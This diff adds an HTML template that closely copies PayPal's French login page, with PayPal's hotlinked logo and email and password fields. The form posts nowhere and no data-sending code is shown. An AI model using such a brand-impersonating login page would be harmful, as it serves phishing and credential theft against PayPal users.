@@ -1,0 +1,41 @@
+<head>
+    <link rel="stylesheet" href="Style/style.css">
+	<section id="section-navbar">
+		<nav id="navbar">
+			<a routerLink="home">
+		<!-- <img id="logo-paypal" src="logo-paypal.png"> -->
+	  </a>
+			<div class="navbar-links">
+				<ul>
+					<li><a href="dashboard">Tableau de bord</a></li>
+				</ul>
+			</div>
+		</nav>
+	  </section>
+</head>
+<div id="main" class="main " role="main">
+    <section id="login" class="login" data-role="page" data-title="Se connecter à un compte Paypal">
+        <div class="corral">
+              <div id="content" class="contentContainer">
+                <header>
+                    <p class="paypal-logo paypal-logo-long"><center><img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png"></center></p>
+                  </header>
+                <form action="#" method="post" class="proceed maskable" name="login" autocomplete="off" novalidate="">
+                    <div id="passwordSection" class="clearfix">
+                        <div class="textInput" id="login_emaildiv">
+                            <div class="fieldWrapper">
+                                <label for="email" class="fieldLabel">Email</label>
+                                <input id="email" name="login_email" type="email" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" autocomplete="off" placeholder="Email">
+                           </div>
+                        </div>
+                        
+                     <div class="textInput lastInputField" id="login_passworddiv">
+                         <div class="fieldWrapper"><label for="password" class="fieldLabel">Mot de passe</label>
+                            <input id="password" name="login_password" type="password" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" placeholder="Mot de passe">
+                       </div>
+                     </div>
+                   </div>
+               <div class="actions actionsSpaced"><button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login">Se connecter</div><div class="forgotLink"><a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Vous n'arrivez pas à vous connecter ?</a></div><input type="hidden" id="bp_mid" name="bp_mid" value="">
+               </form>
+               
+               <a href="#" class="button secondary" id="createAccount">Créer une compte</a></div></div></section></div>	
